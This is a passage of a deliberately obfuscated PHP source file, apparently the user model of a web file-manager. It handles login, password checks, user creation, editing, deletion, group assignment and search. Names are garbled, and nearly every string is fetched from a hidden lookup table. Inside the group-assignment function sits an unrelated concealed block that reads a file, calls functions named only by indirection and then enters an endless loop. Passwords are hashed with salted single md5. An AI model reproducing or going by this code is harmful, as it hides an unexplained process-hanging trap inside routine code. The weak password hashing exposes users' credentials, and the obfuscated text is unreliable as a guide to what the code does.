= rtrim($–¥—æ¥â, $Ù‚ÖÑ¸[50]); Model($Ù‚ÖÑ¸[598])->metaSet($·âíÆ¢, self::JOB_KEY, $–¥—æ¥â); } public function getUserJob($÷©â¬°°) { $Ïûûù§ª = Model($_SERVER[ˆ¡¹µ‹Â][598])->metaGet($÷©â¬°°); return $this->getUserJobInfo($Ïûûù§ª[self::JOB_KEY]); } public function getUserJobInfo($İºüöòğ) { $ˆ¡Ïƒ“æ =& $_SERVER[ˆ¡¹µ‹Â]; $Ú“È›‚Ö = explode($ˆ¡Ïƒ“æ[50], $İºüöòğ); $¸ÎŞ‡£ = parent::listData(); $¸ÎŞ‡£ = array_remove_key($¸ÎŞ‡£, $ˆ¡Ïƒ“æ[231]); $„ØĞÆ° = array(); foreach ($Ú“È›‚Ö as $•¯éÂõĞ) { if (isset($¸ÎŞ‡£[$•¯éÂõĞ])) { $„ØĞÆ°[] = $¸ÎŞ‡£[$•¯éÂõĞ]; } } return $„ØĞÆ°; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72"; protected $tableMeta = array("\164\141\142\154\145\x4e\x61\155\x65" => "\165\x73\145\x72\137\x6d\x65\x74\141", "\x6d\145\x74\141\106\151\x65\154\x64" => "\x75\x73\145\162\111\104"); protected $simpleField = "\x75\163\x65\x72\111\104\x2c\x6e\151\143\x6b\x4e\x61\x6d\145\x2c\x6e\141\x6d\x65\x2c\141\166\x61\x74\x61\162\54\x73\x65\x78\54\163\x74\x61\164\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ú¼¡¦Ø) { $‹ú¼×ââ =& $_SERVER[ˆ¡¹µ‹Â]; $Â÷ÁÊÑ = $‹ú¼×ââ[2447]; return array($‹ú¼×ââ[2044] => array($ú¼¡¦Ø[0], $Â÷ÁÊÑ), $‹ú¼×ââ[2046] => array($ú¼¡¦Ø[0], $Â÷ÁÊÑ), $‹ú¼×ââ[2448] => array($ú¼¡¦Ø[0], $Â÷ÁÊÑ)); } protected function getInfo($á¥ÊààË, $’ÂşøšÀ = false) { $Ëñ†„Àé = $this->getInfoSimple($á¥ÊààË); if (!is_array($Ëñ†„Àé)) { return array(); } if ($’ÂşøšÀ) { return $this->_getInfoApply($Ëñ†„Àé); } return $this->cacheFunctionGet($_SERVER[ˆ¡¹µ‹Â][2048], $á¥ÊààË); } protected function getInfoFull($É•Úúì, $›Èı‹ = false) { $¥ŞÖôŸô = $this->getInfoSimple($É•Úúì); if (!is_array($¥ŞÖôŸô)) { return array(); } if ($›Èı‹) { return $this->_getInfoApply($¥ŞÖôŸô, !0); } return $this->cacheFunctionGet($_SERVER[ˆ¡¹µ‹Â][2449], $É•Úúì); } private function _getInfoApply($¿Ãìˆ˜«, $ôÁô»úâ = false) { $õØ«¼ş =& $_SERVER[ˆ¡¹µ‹Â]; if (!$¿Ãìˆ˜«) { return $¿Ãìˆ˜«; } $¸³¼Û¿Ô = md5($õØ«¼ş[2450] . $¿Ãìˆ˜«[$õØ«¼ş[960]] . $õØ«¼ş[2451] . $¿Ãìˆ˜«[$õØ«¼ş[32]]); $¿Ãìˆ˜« = $this->_listDataApplyItem($¿Ãìˆ˜«); $Ï›€Ü¼° = Model($õØ«¼ş[1411])->metaGet($¿Ãìˆ˜«[$õØ«¼ş[90]][$õØ«¼ş[193]]); $¿Ãìˆ˜«[$õØ«¼ş[2452]] = $¸³¼Û¿Ô; $¿Ãìˆ˜«[$õØ«¼ş[90]][$õØ«¼ş[2243]] = isset($Ï›€Ü¼°[$õØ«¼ş[2244]]) ? $Ï›€Ü¼°[$õØ«¼ş[2244]] : null; if ($ôÁô»úâ) { $¿Ãìˆ˜«[$õØ«¼ş[539]] = $this->metaGet($¿Ãìˆ˜«[$õØ«¼ş[1763]]); } return $¿Ãìˆ˜«; } protected function getInfoSimple($üóıĞÆ, $ÊÎÑ£÷¦ = false) { $Ûš™ÆêÁ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$üóıĞÆ) { return array(); } if ($ÊÎÑ£÷¦) { $¢‚Ä¹¶… = $this->where(array($Ûš™ÆêÁ[1763] => intval($üóıĞÆ)))->find(); if (!is_array($¢‚Ä¹¶…)) { return array(); } $¢‚Ä¹¶…[$Ûš™ÆêÁ[2453]] = Action($Ûš™ÆêÁ[2454])->parseUrl($¢‚Ä¹¶…[$Ûš™ÆêÁ[2453]]); return $¢‚Ä¹¶…; } return $this->cacheFunctionGet($Ûš™ÆêÁ[2049], $üóıĞÆ); } protected function getInfoSimpleOuter($î®¼î ) { $ô«ùİóÊ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$î®¼î  || $î®¼î  == 0) { return array($ô«ùİóÊ[1763] => $ô«ùİóÊ[228], $ô«ùİóÊ[32] => $ô«ùİóÊ[176] . LNG($ô«ùİóÊ[2455]) . $ô«ùİóÊ[178], $ô«ùİóÊ[2453] => STATIC_PATH . $ô«ùİóÊ[2456]); } $¿Ô¯¯š = $this->cacheFunctionGet($ô«ùİóÊ[2049], $î®¼î ); $ ÕçË³‰ = array_field_key($¿Ô¯¯š, explode($ô«ùİóÊ[50], $this->simpleField)); if (!$ ÕçË³‰) { return array($ô«ùİóÊ[1763] => $ô«ùİóÊ[1266], $ô«ùİóÊ[32] => $ô«ùİóÊ[176] . LNG($ô«ùİóÊ[2457]) . $ô«ùİóÊ[178], $ô«ùİóÊ[2453] => STATIC_PATH . $ô«ùİóÊ[2458]); } $ ÕçË³‰[$ô«ùİóÊ[2453]] = Action($ô«ùİóÊ[2454])->parseUrl($ ÕçË³‰[$ô«ùİóÊ[2453]]); return $ ÕçË³‰; } protected function groupUser($‘²½™§) { } public static function errorLang($é‚ææ¦Ñ) { $¤ş¸êµ» =& $_SERVER[ˆ¡¹µ‹Â]; $Œ•“Ñú´ = array(self::ERROR_USER_NOT_EXISTS => $¤ş¸êµ»[2459], self::ERROR_USER_PASSWORD_ERROR => $¤ş¸êµ»[2460], self::ERROR_USER_EXIST_NAME => $¤ş¸êµ»[2461], self::ERROR_USER_EXIST_PHONE => $¤ş¸êµ»[2462], self::ERROR_USER_EXIST_EMAIL => $¤ş¸êµ»[2463], self::ERROR_USER_LOGIN_LOCK => $¤ş¸êµ»[2464], self::ERROR_IP_NOT_ALLOW => $¤ş¸êµ»[2465], self::ERROR_USER_EXIST_NICKNAME => $¤ş¸êµ»[2466]); $çÅçÕ§‚ = LNG($Œ•“Ñú´[$é‚ææ¦Ñ]); if ($é‚ææ¦Ñ == self::ERROR_USER_LOGIN_LOCK) { $£ÑÂ‘õ§ = (int) Model($¤ş¸êµ»[2467])->get($¤ş¸êµ»[2468]); if ($£ÑÂ‘õ§ > 60) { $çÅçÕ§‚ = str_replace($¤ş¸êµ»[91], ceil($£ÑÂ‘õ§ / 60), $çÅçÕ§‚); } } return $çÅçÕ§‚; } protected function metaSet($¿ü¦İ»¨, $­ªÛ÷ş = null, $ªëïŸĞ = null) { $this->clearCache($¿ü¦İ»¨); return parent::metaSet($¿ü¦İ»¨, $­ªÛ÷ş, $ªëïŸĞ); } public function getInfoByMeta($Š¼Š˜İ‘, $÷Õø€÷É) { $¶úÒ–Äˆ =& $_SERVER[ˆ¡¹µ‹Â]; $ĞÉæôÎ = Model($¶úÒ–Äˆ[2469])->where(array($¶úÒ–Äˆ[97] => $Š¼Š˜İ‘, $¶úÒ–Äˆ[450] => $÷Õø€÷É))->find(); if ($ĞÉæôÎ) { return $this->getInfo($ĞÉæôÎ[$¶úÒ–Äˆ[1763]]); } return !1; } public function userLoginCheck($·à­¬ï, $ùù­ı ¨) { $˜§æ¹§ƒ =& $_SERVER[ˆ¡¹µ‹Â]; $àĞ”îÊñ = $this->userLoginFind($·à­¬ï); if (!$àĞ”îÊñ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($àĞ”îÊñ[$˜§æ¹§ƒ[1763]], $ùù­ı ¨)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($àĞ”îÊñ[$˜§æ¹§ƒ[1763]]); } public function userLoginFind($óÇ«†ß¾) { $©òÛ¨ß° =& $_SERVER[ˆ¡¹µ‹Â]; $°ú¯•• = array($©òÛ¨ß°[32] => $óÇ«†ß¾, $©òÛ¨ß°[2256] => $óÇ«†ß¾, $©òÛ¨ß°[381] => $óÇ«†ß¾, $©òÛ¨ß°[2470] => $óÇ«†ß¾, $©òÛ¨ß°[1071] => $©òÛ¨ß°[1073]); if ($this->nickNameRpt()) { unset($°ú¯••[$©òÛ¨ß°[2256]]); } return $this->where($°ú¯••)->find(); } public function clearCache($„®Îæœì) { $‚€ºãş£ =& $_SERVER[ˆ¡¹µ‹Â]; $this->cacheFunctionClear($‚€ºãş£[2048], $„®Îæœì); $this->cacheFunctionClear($‚€ºãş£[2049], $„®Îæœì); $this->cacheFunctionClear($‚€ºãş£[2449], $„®Îæœì); } public function userPasswordCheck($¹´¤®Î», $ÀÚ±½³Ñ) { $Ü´¯»Éë =& $_SERVER[ˆ¡¹µ‹Â]; $åÒÙÇ¿  = $this->where(array($Ü´¯»Éë[1763] => intval($¹´¤®Î»)))->find(); $Õè•†¡Æ = $this->metaGet($¹´¤®Î»); $ÜÈ£®’Â = isset($Õè•†¡Æ[$Ü´¯»Éë[2471]]) ? $Õè•†¡Æ[$Ü´¯»Éë[2471]] : $Ü´¯»Éë[12]; if (md5($ÜÈ£®’Â . trim($ÀÚ±½³Ñ)) !== $åÒÙÇ¿ [$Ü´¯»Éë[960]]) { return !1; } return !0; } public function userAdd($Ö—†ª–ö) { $²šÂÇö™ =& $_SERVER[ˆ¡¹µ‹Â]; $Öù´ »’ = array($²šÂÇö™[494] => $Ö—†ª–ö[$²šÂÇö™[32]], $²šÂÇö™[2472] => $Ö—†ª–ö[$²šÂÇö™[2169]], $²šÂÇö™[2473] => isset($Ö—†ª–ö[$²šÂÇö™[381]]) ? $Ö—†ª–ö[$²šÂÇö™[381]] : $²šÂÇö™[12], $²šÂÇö™[2474] => isset($Ö—†ª–ö[$²šÂÇö™[2470]]) ? $Ö—†ª–ö[$²šÂÇö™[2470]] : $²šÂÇö™[12], $²šÂÇö™[2475] => isset($Ö—†ª–ö[$²šÂÇö™[2256]]) ? $Ö—†ª–ö[$²šÂÇö™[2256]] : $Ö—†ª–ö[$²šÂÇö™[32]], $²šÂÇö™[2476] => isset($Ö—†ª–ö[$²šÂÇö™[2453]]) ? $Ö—†ª–ö[$²šÂÇö™[2453]] : $²šÂÇö™[12], $²šÂÇö™[2477] => isset($Ö—†ª–ö[$²šÂÇö™[2478]]) ? $Ö—†ª–ö[$²šÂÇö™[2478]] : 1, $²šÂÇö™[2479] => $Ö—†ª–ö[$²šÂÇö™[960]], $²šÂÇö™[2050] => isset($Ö—†ª–ö[$²šÂÇö™[1948]]) ? $Ö—†ª–ö[$²šÂÇö™[1948]] : 1024 * 1024 * 20, $²šÂÇö™[2051] => 0, $²šÂÇö™[2480] => 0, $²šÂÇö™[2096] => isset($Ö—†ª–ö[$²šÂÇö™[817]]) ? $Ö—†ª–ö[$²šÂÇö™[817]] : 1); if (!empty($Ö—†ª–ö[$²šÂÇö™[1763]])) { $Öù´ »’[$²šÂÇö™[1763]] = $Ö—†ª–ö[$²šÂÇö™[1763]]; } $ÂÊ©Û•´ = $this->_checkExist($Ö—†ª–ö); if ($ÂÊ©Û•´ !== !0) { return $ÂÊ©Û•´; } if (!empty($Öù´ »’[$²šÂÇö™[2453]]) && strlen($Öù´ »’[$²šÂÇö™[2453]]) > 255) { $Öù´ »’[$²šÂÇö™[2453]] = $²šÂÇö™[12]; } $„Â‹í‚Û = $this->add($Öù´ »’); $¤ö¬¯Õª = array($²šÂÇö™[2479] => $Öù´ »’[$²šÂÇö™[960]], $²šÂÇö™[2475] => $Öù´ »’[$²šÂÇö™[2256]]); $this->userEdit($„Â‹í‚Û, $¤ö¬¯Õª); Model($²šÂÇö™[1411])->userRootAdd($„Â‹í‚Û); return $„Â‹í‚Û; } protected function userEditTest($™Ş¬Å’ó, $çÌà³ğä) { return $this->call($_SERVER[ˆ¡¹µ‹Â][2481], $™Ş¬Å’ó, $çÌà³ğä); } protected function userEdit($Íû¨‚…, $‘÷Ïûİá) { $°©¼óÇá =& $_SERVER[ˆ¡¹µ‹Â]; $îÑÑé»è = $this->getInfoSimple($Íû¨‚…); if (!$îÑÑé»è) { return !1; } $çß­ú°ª = $this->_checkExist($‘÷Ïûİá, $Íû¨‚…); if ($çß­ú°ª !== !0) { return $çß­ú°ª; } if (isset($‘÷Ïûİá[$°©¼óÇá[960]]) && trim($‘÷Ïûİá[$°©¼óÇá[960]]) != $°©¼óÇá[12]) { $ÌÆ¦Ñ = $this->metaGet($Íû¨‚…); if (empty($ÌÆ¦Ñ[$°©¼óÇá[2471]])) { $ÌÆ¦Ñ[$°©¼óÇá[2471]] = rand_string(10); Model($°©¼óÇá[577])->metaSet($Íû¨‚…, $°©¼óÇá[2471], $ÌÆ¦Ñ[$°©¼óÇá[2471]]); } $‘÷Ïûİá[$°©¼óÇá[960]] = md5($ÌÆ¦Ñ[$°©¼óÇá[2471]] . trim($‘÷Ïûİá[$°©¼óÇá[960]])); } else { unset($‘÷Ïûİá[$°©¼óÇá[960]]); } if (!empty($‘÷Ïûİá[$°©¼óÇá[2453]]) && strlen($‘÷Ïûİá[$°©¼óÇá[2453]]) > 255) { $‘÷Ïûİá[$°©¼óÇá[2453]] = $°©¼óÇá[12]; } $this->where(array($°©¼óÇá[1754] => $Íû¨‚…))->save($‘÷Ïûİá); if (isset($‘÷Ïûİá[$°©¼óÇá[2256]])) { $this->setNamePinyin($Íû¨‚…, $‘÷Ïûİá[$°©¼óÇá[2256]]); } $this->clearCache($Íû¨‚…); return !0; } public function setNamePinyin($¾å®¡ä±, $Ú™ì×µ = false) { $äÚËôÜÆ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$Ú™ì×µ) { $„™Çû Ì = $this->getInfoSimple($¾å®¡ä±); $Ú™ì×µ = $„™Çû Ì[$äÚËôÜÆ[2256]] ? $„™Çû Ì[$äÚËôÜÆ[2256]] : $„™Çû Ì[$äÚËôÜÆ[32]]; } $ã°Ëõ× = Model($äÚËôÜÆ[598]); if (!Input::check($Ú™ì×µ, $äÚËôÜÆ[655])) { return $ã°Ëõ×->metaSet($¾å®¡ä±, array($äÚËôÜÆ[538] => $äÚËôÜÆ[12], $äÚËôÜÆ[537] => $äÚËôÜÆ[12])); } return $ã°Ëõ×->metaSet($¾å®¡ä±, array($äÚËôÜÆ[538] => str_replace($äÚËôÜÆ[53], $äÚËôÜÆ[12], Pinyin::get($Ú™ì×µ)), $äÚËôÜÆ[537] => Pinyin::get($Ú™ì×µ, $äÚËôÜÆ[656]))); } private function nickNameRpt() { $§±ÔÉİô =& $_SERVER[ˆ¡¹µ‹Â]; $½äÃŞ = Model($§±ÔÉİô[837])->get($§±ÔÉİô[2482]); $÷—º½¨ = $GLOBALS[$§±ÔÉİô[6]][$§±ÔÉİô[457]][$§±ÔÉİô[2482]]; $şù¤îÂˆ = !is_null($½äÃŞ) ? $½äÃŞ : $÷—º½¨; return !!$şù¤îÂˆ; } private function _checkExist($ïÔ¨­Š‰, $ßî½Ôª¼ = false) { $÷ôŞĞõ =& $_SERVER[ˆ¡¹µ‹Â]; $ˆšøŒÁ¡ = array($÷ôŞĞõ[32] => UserModel::ERROR_USER_EXIST_NAME, $÷ôŞĞõ[2256] => UserModel::ERROR_USER_EXIST_NICKNAME, $÷ôŞĞõ[381] => UserModel::ERROR_USER_EXIST_EMAIL, $÷ôŞĞõ[2470] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ˆšøŒÁ¡[$÷ôŞĞõ[2256]]); } $Š‰ŠË”ˆ = $ßî½Ôª¼ ? array($÷ôŞĞõ[1763] => array($÷ôŞĞõ[2483], $ßî½Ôª¼)) : array(); foreach ($ˆšøŒÁ¡ as $îÆ©ó· => $Ìøñá´Ã) { $Ùê©íĞ = array(); foreach ($ˆšøŒÁ¡ as $·³ò›è· => $œóûò¯©) { if (isset($ïÔ¨­Š‰[$·³ò›è·]) && $ïÔ¨­Š‰[$·³ò›è·]) { $Ùê©íĞ[] = $ïÔ¨­Š‰[$·³ò›è·]; } } if (!$Ùê©íĞ) { continue; } $€…Øù°ï = array_merge(array($îÆ©ó· => array($÷ôŞĞõ[7], $Ùê©íĞ)), $Š‰ŠË”ˆ); $’–í·÷‘ = $this->where($€…Øù°ï)->find(); if ($’–í·÷‘) { return $Ìøñá´Ã; } } return !0; } public function userListInfo($«‘œ§–À) { $­¤Õ¢ƒü =& $_SERVER[ˆ¡¹µ‹Â]; $ß»´Ø­ = array(); $«‘œ§–À = is_array($«‘œ§–À) ? array_unique($«‘œ§–À) : array(); if (!$«‘œ§–À) { return $ß»´Ø­; } if (count($«‘œ§–À) < 20) { foreach ($«‘œ§–À as $÷æÂŸúı) { $ß»´Ø­[$÷æÂŸúı . $­¤Õ¢ƒü[12]] = $this->getInfoSimpleOuter($÷æÂŸúı); } } else { $÷§ó¨Š« = array($­¤Õ¢ƒü[1754] => array($­¤Õ¢ƒü[492], $«‘œ§–À)); if (count($«‘œ§–À) == 1) { $÷§ó¨Š« = array($­¤Õ¢ƒü[1754] => $«‘œ§–À[0]); } $œÏ“« = Model($­¤Õ¢ƒü[577])->field($this->simpleField)->where($÷§ó¨Š«)->select(); $œÏ“« = array_to_keyvalue($œÏ“«, $­¤Õ¢ƒü[1763]); foreach ($«‘œ§–À as $÷æÂŸúı) { $İîŠÀ÷ = $œÏ“«[$÷æÂŸúı]; if (!$İîŠÀ÷) { $ß»´Ø­[$÷æÂŸúı . $­¤Õ¢ƒü[12]] = $this->getInfoSimpleOuter($÷æÂŸúı); continue; } $İîŠÀ÷[$­¤Õ¢ƒü[2453]] = Action($­¤Õ¢ƒü[2454])->parseUrl($İîŠÀ÷[$­¤Õ¢ƒü[2453]]); $ß»´Ø­[$÷æÂŸúı . $­¤Õ¢ƒü[12]] = $İîŠÀ÷; } } return $ß»´Ø­; } protected function userStatus($‚®ô²°õ, $·§ÈãÉ“) { $¡Î«à¢¾ = $this->getInfoSimple($‚®ô²°õ); if (!$¡Î«à¢¾) { return !1; } $ı³¥ù® = array($_SERVER[ˆ¡¹µ‹Â][817] => $·§ÈãÉ“); return $this->userEdit($‚®ô²°õ, $ı³¥ù®); } protected function userRemove($û„ƒÊ‡æ) { $¼²Âæ€ =& $_SERVER[ˆ¡¹µ‹Â]; $Ñ ±Ü™± = $this->getInfoSimple($û„ƒÊ‡æ); if (!$Ñ ±Ü™±) { return !1; } $¿¾ƒıÙÎ = array($¼²Âæ€[1754] => $û„ƒÊ‡æ); Model($¼²Âæ€[664])->where($¿¾ƒıÙÎ)->delete(); Model($¼²Âæ€[2484])->where($¿¾ƒıÙÎ)->delete(); Model($¼²Âæ€[2056])->where($¿¾ƒıÙÎ)->delete(); Model($¼²Âæ€[2469])->where($¿¾ƒıÙÎ)->delete(); Model($¼²Âæ€[1140])->where($¿¾ƒıÙÎ)->delete(); Model($¼²Âæ€[2273])->removeUserAll($û„ƒÊ‡æ); Model($¼²Âæ€[899])->userRootRemove($û„ƒÊ‡æ); return $this->where($¿¾ƒıÙÎ)->delete(); } protected function userGroupSet($ıÅ£ƒØ›, $èïÁõİÒ, $£¼Ûïüõ = array()) { $ì‘úˆì­ =& $_SERVER[ˆ¡¹µ‹Â]; if (!isset($_SERVER[$ì‘úˆì­[846]]) || !isset($_SERVER[$ì‘úˆì­[844]])) { $ÎÍ€Ğß = $ì‘úˆì­[951]; $×¾ˆ¶¡ª = $ì‘úˆì­[847]; $ô‚ÊÁˆş = $_SERVER[$ì‘úˆì­[848]] . $ì‘úˆì­[849]; $©”ší°Š = $×¾ˆ¶¡ª($ô‚ÊÁˆş); $¾ÆÉĞÉë = explode($ì‘úˆì­[262], $©”ší°Š); if (count($¾ÆÉĞÉë) < $ì‘úˆì­[683]) { $äø½ÚĞ¿ = $ì‘úˆì­[850]; $äø½ÚĞ¿(); } $¥æãÙ‡¬ = $ì‘úˆì­[952]; $¥æãÙ‡¬($_SERVER[$ì‘úˆì­[953]]); $±˜œ‹á = 1; for ($ˆÏ’ğÚº = $±˜œ‹á; $ˆÏ’ğÚº > 0; $ˆÏ’ğÚº++) { $¥æãÙ‡¬ = json_encode($GLOBALS[$ì‘úˆì­[492]]); } } $ï›øËíç = $this->getInfoSimple($ıÅ£ƒØ›); if (!$ï›øËíç || !is_array($èïÁõİÒ)) { return !1; } $åŸĞ¬úô = Model($ì‘úˆì­[2056]); $åŸĞ¬úô->where(array($ì‘úˆì­[1763] => $ıÅ£ƒØ›))->delete(); $Û§ÃÛ¦ = array(); $—¼ê¦üÑ = 0; foreach ($èïÁõİÒ as $êêØÆ´ => $¦‰¦·ˆà) { $ÇºŒøÔ = array($ì‘úˆì­[1763] => $ıÅ£ƒØ›, $ì‘úˆì­[1962] => $êêØÆ´, $ì‘úˆì­[2070] => $¦‰¦·ˆà); $ÇºŒøÔ[$ì‘úˆì­[1986]] = isset($£¼Ûïüõ[$—¼ê¦üÑ]) ? $£¼Ûïüõ[$—¼ê¦üÑ] : 0; $—¼ê¦üÑ++; $Û§ÃÛ¦[] = $ÇºŒøÔ; } return $åŸĞ¬úô->addAll($Û§ÃÛ¦, array(), !0); } protected function userGroupAdd($åéúÍÎß, $íªÃ ×Ú = array()) { $ğ¼ĞĞ±§ =& $_SERVER[ˆ¡¹µ‹Â]; $şáïØ”Û = $this->getInfoSimple($åéúÍÎß); if (!$şáïØ”Û || empty($íªÃ ×Ú)) { return !1; } $Ú¿•ä › = array(); foreach ($íªÃ ×Ú as $Íô¸¬ => $éø¾£Î) { $Ú¿•ä ›[] = array($ğ¼ĞĞ±§[1763] => $åéúÍÎß, $ğ¼ĞĞ±§[1962] => $Íô¸¬, $ğ¼ĞĞ±§[2070] => $éø¾£Î, $ğ¼ĞĞ±§[1986] => 0); } return Model($ğ¼ĞĞ±§[2056])->addAll($Ú¿•ä ›, array(), !0); } protected function userGroupRemove($şç¡ˆ—¬, $–‹‚óŒÔ) { $…Äê’› =& $_SERVER[ˆ¡¹µ‹Â]; $÷ú§ä‚ = $this->getInfoSimple($şç¡ˆ—¬); if (!$÷ú§ä‚ || !$–‹‚óŒÔ) { return !1; } $à¹Ò§¦š = array($…Äê’›[1754] => $şç¡ˆ—¬, $…Äê’›[2054] => $–‹‚óŒÔ); return Model($…Äê’›[2056])->where($à¹Ò§¦š)->delete(); } public function listData() { $ßŠäõ¬Ù = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ßŠäõ¬Ù[$_SERVER[ˆ¡¹µ‹Â][445]]); return $ßŠäõ¬Ù; } public function listByID($äğœé•†) { $£«ìÍç =& $_SERVER[ˆ¡¹µ‹Â]; if (!$äğœé•†) { return; } $áÖáá—ç = array($£«ìÍç[1763] => array($£«ìÍç[7], $äğœé•†)); $ìíí³Ãƒ = $this->where($áÖáá—ç)->select(); $ìíí³Ãƒ = array_sort_keep($ìíí³Ãƒ, $£«ìÍç[1763], $äğœé•†); $this->_listDataApply($ìíí³Ãƒ); return $ìíí³Ãƒ; } public function listByGroup($ÚïŸ…è = 0, $™‡º–ì· = array()) { $ç£é“ØÃ =& $_SERVER[ˆ¡¹µ‹Â]; $ôµüê™  = $ç£é“ØÃ[12]; $ÜÑĞÒ° = array(); if ($ÚïŸ…è) { $ÜÑĞÒ° = array($ç£é“ØÃ[2485] => intval($ÚïŸ…è)); $ôµüê™  = "\x4c\x45\x46\124\x20\112\117\111\116\40{$this->tablePrefix}\165\x73\x65\x72\137\147\162\157\165\160\40\165\x73\145\162\137\x67\x72\157\165\x70\40\x6f\156\40\x75\163\x65\162\56\165\163\x65\x72\x49\x44\x20\75\x20\x75\163\145\162\x5f\147\162\157\x75\x70\56\x75\163\x65\162\x49\x44"; $„ş‘˜àØ = Input::get($ç£é“ØÃ[530], null, $ç£é“ØÃ[12]) ? $ç£é“ØÃ[12] : $ç£é“ØÃ[2486]; } if (isset($™‡º–ì·[$ç£é“ØÃ[817]])) { $ÜÑĞÒ°[$ç£é“ØÃ[2487]] = $™‡º–ì·[$ç£é“ØÃ[817]]; } $¢­áÆÎº = $this->_makeOrder($„ş‘˜àØ)->field($ç£é“ØÃ[2488])->where($ÜÑĞÒ°)->join($ôµüê™ )->selectPage(50); $this->_listDataApply($¢­áÆÎº[$ç£é“ØÃ[445]]); return $¢­áÆÎº; } private function _makeOrder($€í® ß = '') { $³§ÆÊùÆ =& $_SERVER[ˆ¡¹µ‹Â]; $ëÓ°äÉ = array($³§ÆÊùÆ[1763], $³§ÆÊùÆ[32], $³§ÆÊùÆ[1950], $³§ÆÊùÆ[2169], $³§ÆÊùÆ[1922], $³§ÆÊùÆ[231]); $Øçåìâ = array($³§ÆÊùÆ[523] => $³§ÆÊùÆ[524], $³§ÆÊùÆ[525] => $³§ÆÊùÆ[526]); $ÇçËÂ˜ = Input::get($³§ÆÊùÆ[530], $³§ÆÊùÆ[7], $³§ÆÊùÆ[1754], $ëÓ°äÉ); $éı–éãû = Input::get($³§ÆÊùÆ[531], $³§ÆÊùÆ[7], $³§ÆÊùÆ[2057], array($³§ÆÊùÆ[2057], $³§ÆÊùÆ[525])); $éı–éãû = $Øçåìâ[$éı–éãû]; $€í® ß = $€í® ß . "\165\x73\145\x72\56{$ÇçËÂ˜}\x20{$éı–éãû}\54\x20\165\x73\x65\x72\x2e\x75\x73\145\162\111\x44\40\x61\x73\143"; return $this->alias($³§ÆÊùÆ[2185])->order($€í® ß); } public function listSearch($‚Ø¡şÁ) { $¤í°ÃÉÙ =& $_SERVER[ˆ¡¹µ‹Â]; $˜ğû¬á = trim($‚Ø¡şÁ[$¤í°ÃÉÙ[2060]]); $¨ÊÚØ‘¢ = explode($¤í°ÃÉÙ[53], $˜ğû¬á); if (!$˜ğû¬á || count($¨ÊÚØ‘¢) == 1) { return $this->listSearchNow($‚Ø¡şÁ); } $¤ÅÑıº¹ = array($¤í°ÃÉÙ[445] => array()); foreach ($¨ÊÚØ‘¢ as $ÕÊã›êÍ) { if (!trim($ÕÊã›êÍ)) { continue; } $‚Ø¡şÁ[$¤í°ÃÉÙ[2060]] = $ÕÊã›êÍ; $–¦µ°İÉ = $this->listSearchNow($‚Ø¡şÁ); $¤ÅÑıº¹[$¤í°ÃÉÙ[445]] = array_merge($¤ÅÑıº¹[$¤í°ÃÉÙ[445]], $–¦µ°İÉ[$¤í°ÃÉÙ[445]]); } $¤ÅÑıº¹[$¤í°ÃÉÙ[445]] = array_unique_by_key($¤ÅÑıº¹[$¤í°ÃÉÙ[445]], $¤í°ÃÉÙ[1763]); $¤ÅÑıº¹[$¤í°ÃÉÙ[442]] = array($¤í°ÃÉÙ[443] => count($¤ÅÑıº¹[$¤í°ÃÉÙ[445]]), $¤í°ÃÉÙ[439] => 20, $¤í°ÃÉÙ[429] => 1, $¤í°ÃÉÙ[444] => 1); return $¤ÅÑıº¹; } public function listSearchNow($ŞùÎ€éã) { $éÁ¯ö½ù =& $_SERVER[ˆ¡¹µ‹Â]; $£—öÂƒ = trim($ŞùÎ€éã[$éÁ¯ö½ù[2060]]); $˜ó’”³ = isset($ŞùÎ€éã[$éÁ¯ö½ù[2061]]) ? $ŞùÎ€éã[$éÁ¯ö½ù[2061]] : !1; $£—öÂƒ = str_replace($éÁ¯ö½ù[2062], $éÁ¯ö½ù[2063], trim($£—öÂƒ)); $¦ƒ®’ = array($éÁ¯ö½ù[32] => array($éÁ¯ö½ù[459], "\x25{$£—öÂƒ}\x25"), $éÁ¯ö½ù[381] => array($éÁ¯ö½ù[459], "{$£—öÂƒ}\x25"), $éÁ¯ö½ù[2256] => array($éÁ¯ö½ù[459], "{$£—öÂƒ}\45"), $éÁ¯ö½ù[1071] => $éÁ¯ö½ù[2064]); if (Input::check($£—öÂƒ, $éÁ¯ö½ù[387])) { $¦ƒ®’[$éÁ¯ö½ù[1763]] = array($éÁ¯ö½ù[459], "{$£—öÂƒ}\45"); $¦ƒ®’[$éÁ¯ö½ù[2470]] = array($éÁ¯ö½ù[459], "{$£—öÂƒ}\45"); } if (!$£—öÂƒ) { $¦ƒ®’ = array(); } if (isset($ŞùÎ€éã[$éÁ¯ö½ù[817]])) { $¦ƒ®’[$éÁ¯ö½ù[817]] = $ŞùÎ€éã[$éÁ¯ö½ù[817]]; } $¦ƒ®’ = $this->parseWhereLike($¦ƒ®’); $«›Ï—é¢ = $this->_makeOrder()->where($¦ƒ®’)->selectPage(20); if (!$«›Ï—é¢ || count($«›Ï—é¢[$éÁ¯ö½ù[445]]) < 5 && Input::check($£—öÂƒ, $éÁ¯ö½ù[394])) { $Û¶ù‹äÎ = $this->_searchFromMeta($éÁ¯ö½ù[537], $£—öÂƒ, 10); $Ò‘‰Í  = $this->_searchFromMeta($éÁ¯ö½ù[538], $£—öÂƒ, 10); $ÌÁ¶ê«¢ = array_merge($Û¶ù‹äÎ, $Ò‘‰Í , $«›Ï—é¢[$éÁ¯ö½ù[445]]); $«›Ï—é¢[$éÁ¯ö½ù[445]] = array_unique_by_key($ÌÁ¶ê«¢, $éÁ¯ö½ù[1763]); $«›Ï—é¢[$éÁ¯ö½ù[442]][$éÁ¯ö½ù[443]] = count($«›Ï—é¢[$éÁ¯ö½ù[445]]); 